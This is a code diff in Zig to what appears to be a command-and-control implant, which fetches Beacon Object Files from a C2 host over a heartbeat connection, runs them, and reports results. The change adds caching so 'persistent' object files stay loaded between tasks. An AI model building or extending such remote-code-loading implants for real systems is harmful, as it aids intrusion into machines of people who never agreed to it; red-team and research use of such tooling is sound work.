@@ -67,6 +67,7 @@ const State = struct {
     heartbeat_header: std.http.Headers,
     heartbeat_uri: std.Uri,
     pending_bofs: std.ArrayList(PendingBof),
+    persistent_bofs: std.AutoHashMap(u64, bof.Object),
 
     fn init(allocator: std.mem.Allocator) !State {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
@@ -108,6 +109,7 @@ const State = struct {
             .heartbeat_header = heartbeat_header,
             .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
             .pending_bofs = std.ArrayList(PendingBof).init(allocator),
+            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
         };
     }
 
@@ -115,6 +117,7 @@ const State = struct {
         state.http_client.deinit();
         state.heartbeat_header.deinit();
         state.pending_bofs.deinit();
+        state.persistent_bofs.deinit();
         state.* = undefined;
     }
 };
@@ -122,6 +125,7 @@ const State = struct {
 const PendingBof = struct {
     context: *bof.Context,
     request_id: []const u8,
+    is_persistent: bool,
 };
 
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
@@ -143,7 +147,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     _ = args_spec;
 
     const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
-    _ = is_persistent;
 
     // TODO: handle 'buffers'
 
@@ -153,8 +156,19 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     const bof_content = try fetchBofContent(allocator, state, bof_path);
     defer allocator.free(bof_content);
 
-    const bof_object = try bof.Object.initFromMemory(bof_content);
-    errdefer bof_object.release();
+    const bof_object = if (is_persistent) blk: {
+        const hash = std.hash.XxHash64.hash(123, bof_content);
+
+        if (state.persistent_bofs.get(hash)) |existing_bof| break :blk existing_bof;
+
+        const new_bof = try bof.Object.initFromMemory(bof_content);
+        errdefer new_bof.release();
+
+        try state.persistent_bofs.put(hash, new_bof);
+
+        break :blk new_bof;
+    } else try bof.Object.initFromMemory(bof_content);
+    errdefer if (!is_persistent) bof_object.release();
 
     var bof_context: ?*bof.Context = null;
 
@@ -184,6 +198,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
         try state.pending_bofs.append(.{
             .context = context,
             .request_id = try allocator.dupe(u8, root.object.get("id").?.string),
+            .is_persistent = is_persistent,
         });
     } else return error.FailedToRunBof;
 }
@@ -281,7 +296,9 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
                 try request.finish();
             }
 
-            context.getObject().release();
+            if (!pending_bof.is_persistent)
+                context.getObject().release();
+
             context.release();
             allocator.free(pending_bof.request_id);
 
